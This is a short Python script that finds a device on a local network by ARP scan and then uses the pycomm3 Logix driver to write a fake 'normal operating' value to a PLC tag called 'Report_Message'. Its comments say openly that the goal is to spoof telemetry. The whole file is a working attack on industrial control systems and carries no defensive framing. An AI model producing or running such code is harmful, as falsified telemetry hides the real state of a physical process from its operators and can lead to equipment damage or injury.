from pycomm3 import LogixDriver
import socket
from scapy.all import ARP, Ether, srp

def discover_plc_ip():
    # Define the network range to scan (adjust as needed)
    ip_range = "192.168.1.1/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find the PLC
    plc_ip = None
    for sent, received in result:
        if received.psrc.startswith("192.168.1"):  # Adjust based on your network
            plc_ip = received.psrc
            print(f"Discovered PLC at IP: {plc_ip}")
            break

    if not plc_ip:
        raise Exception("PLC not found on the network.")
    
    return plc_ip

def spoof_reporting_message(plc_ip):
    # Connect to the PLC
    with LogixDriver(plc_ip) as plc:
        # Define the tag to write to (adjust based on your PLC's tag structure)
        tag_name = "Report_Message"

        # Define a fake telemetry value (e.g., I/O value)
        fake_value = 100  # Example: Spoofing a normal operating value

        # Write the fake value to the PLC tag
        plc.write(tag_name, fake_value)
        print(f"Spoofed reporting message sent to {plc_ip}: {tag_name} = {fake_value}")

if __name__ == "__main__":
    try:
        # Step 1: Discover the PLC's IP address
        plc_ip = discover_plc_ip()

        # Step 2: Spoof the reporting message
        spoof_reporting_message(plc_ip)
    except Exception as e:
        print(f"Error: {e}")